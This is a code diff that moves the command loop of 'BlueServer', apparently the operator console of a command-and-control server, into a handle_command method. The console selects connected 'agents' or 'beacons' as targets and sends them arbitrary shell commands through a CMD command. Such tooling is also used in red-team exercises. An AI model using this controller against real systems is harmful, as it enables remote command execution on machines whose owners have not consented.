@@ -21,6 +21,60 @@ class BlueServer:
         self.sock.listen(10) #sets backlog to 10
         self.agent_count = 0
 
+    def handle_command(self,userin):
+        splits = userin.split(" ") #splits userinput on each space
+        if userin.upper() == "QUIT" or userin.upper() == 'Q':
+            self.stop()
+        elif userin.upper() == "HELP" or userin == "?":
+            self.help()
+        elif splits[0].upper() == "SET":
+            #Handles setting information
+            if splits[1].upper() == "HELP":
+                self.set_help()
+            elif splits[1].upper() == "TARGETS":
+                targets = splits[2].split(",")
+                for target in targets:
+                    match = re.match(IP_REGEX,target)
+                    if target in self.targets:
+                        continue
+                    elif match:
+                        self.targets.append(self.ip_to_agent(target))
+                    elif self.agentnum_to_agent(target) != None:
+                        self.targets.append(self.agentnum_to_agent(target))
+                    else:
+                        print(target + " not a found connection")
+            else:
+                print("Invalid command, use SET HELP to see valid paramaters for SET")
+        elif splits[0].upper() == "CMD":
+            cmd = ' '.join(splits[1:])
+            cmd = cmd.strip()
+            cmd = "cmd|"+cmd
+            for target in self.targets:
+                try:
+                    target.sock.send(cmd.encode())
+                    reply = target.sock.recv(65535).decode()
+                    print(str(target),reply,sep="\n")
+                except UnicodeDecodeError:
+                    print(str(target)+"\nUnicode Decode Error")
+                except ConnectionResetError:
+                    print(str(target)+f"\nERROR: Connection reset\nBeacon got popped :(\nRemoving Agent #{target.number} from connection list\n")
+                    self.connections.remove(target)
+                    self.targets.remove(target)
+        elif userin.upper() == "SHOW CONNECTIONS" or userin.upper() == "SHOW CONNS":
+            for conn in self.connections:
+                if conn != self.connections[-1]:
+                    print(str(conn),end=",")
+                else:
+                    print(str(conn))
+        elif userin.upper() == "SHOW TARGETS":
+            for target in self.targets:
+                if target != self.targets[-1]:
+                    print(str(target),end=",")
+                else:
+                    print(str(target))
+        else:
+            print("Command does not exist\n")
+
     def start(self):
         self.running = True
         listener = threading.Thread(target=self.accept_connections, daemon=True)
@@ -28,58 +82,8 @@ class BlueServer:
         #Command handler
         while self.running == True:
             userin = input("> ")
-            splits = userin.split(" ") #splits userinput on each space
-            if userin.upper() == "QUIT" or userin.upper() == 'Q':
-                self.stop()
-            elif userin.upper() == "HELP" or userin == "?":
-                self.help()
-            elif splits[0].upper() == "SET":
-                #Handles setting information
-                if splits[1].upper() == "HELP":
-                    self.set_help()
-                elif splits[1].upper() == "TARGETS":
-                    targets = splits[2].split(",")
-                    for target in targets:
-                        match = re.match(IP_REGEX,target)
-                        if target in self.targets:
-                            continue
-                        elif match:
-                            self.targets.append(self.ip_to_agent(target))
-                        elif self.agentnum_to_agent(target) != None:
-                            self.targets.append(self.agentnum_to_agent(target))
-                        else:
-                            print(target + " not a found connection")
-                else:
-                    print("Invalid command, use SET HELP to see valid paramaters for SET")
-            elif splits[0].upper() == "CMD":
-                cmd = ' '.join(splits[1:])
-                cmd = cmd.strip()
-                cmd = "cmd|"+cmd
-                for target in self.targets:
-                    try:
-                        target.sock.send(cmd.encode())
-                        reply = target.sock.recv(65535).decode()
-                        print(str(target),reply,sep="\n")
-                    except UnicodeDecodeError:
-                        print(str(target)+"\nUnicode Decode Error")
-                    except ConnectionResetError:
-                        print(str(target)+f"\nERROR: Connection reset\nBeacon got popped :(\nRemoving Agent #{target.number} from connection list\n")
-                        self.connections.remove(target)
-                        self.targets.remove(target)
-            elif userin.upper() == "SHOW CONNECTIONS" or userin.upper() == "SHOW CONNS":
-                for conn in self.connections:
-                    if conn != self.connections[-1]:
-                        print(str(conn),end=",")
-                    else:
-                        print(str(conn))
-            elif userin.upper() == "SHOW TARGETS":
-                for target in self.targets:
-                    if target != self.targets[-1]:
-                        print(str(target),end=",")
-                    else:
-                        print(str(target))
-            else:
-                print("Command does not exist\n")
+            self.handle_command(userin)
+            
 
     def stop(self):
         self.running = False
